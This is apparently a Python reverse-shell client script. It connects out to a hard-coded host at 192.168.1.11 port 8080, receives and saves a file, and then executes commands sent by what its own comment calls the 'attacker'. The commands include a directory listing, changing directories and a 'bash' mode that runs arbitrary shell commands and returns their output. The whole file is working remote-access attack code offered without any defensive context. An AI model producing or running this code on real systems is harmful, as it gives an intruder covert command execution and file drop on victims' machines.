import socket
import os
import subprocess

def ls():
    return os.listdir()

def pwd():
    return os.getcwd()

def cd(path):
    container = path.split(" ") #cd c://
    os.chdir(container[1])
    path = os.getcwd()
    return path

def bash(cmd):
    try:
        return subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        return ("** no command found...")

#used to bind and accept connection
sockObject=socket.socket()
hostIP = "192.168.1.11"
portNumber = 8080
sockObject.connect((hostIP, portNumber))
print("connected!!")
filename=input(str("Enter a filename for the incoming file:"))
file=open(filename, 'wb')
file_data=sockObject.recv(1024)
file.write(file_data)
file.close()
print("File has been recieved sucessfully!!")

#commands from attacker
while True:
    recievedCommand = sockObject.recv(1024).decode()
    if recievedCommand == "q":
        print("Server stopped the program !")
        break

    elif recievedCommand == "ls":
        result = str(ls())
        sockObject.send(result.encode())

    elif recievedCommand == "pwd":
        result = str(pwd())
        sockObject.send(result.encode())

    elif recievedCommand == "clear":
        pass

    elif recievedCommand.startswith("cd"):
        result = str( cd(recievedCommand))
        sockObject.send(result.encode())

    elif recievedCommand == "bash":
        os.system("cls")
        while True:
            message = "welcome to the bash program execution"
            sockObject.send(message.encode())
            recvd = sockObject.recv(1024).decode()
            output = str(bash(recvd))
            sockObject.send(output.encode())
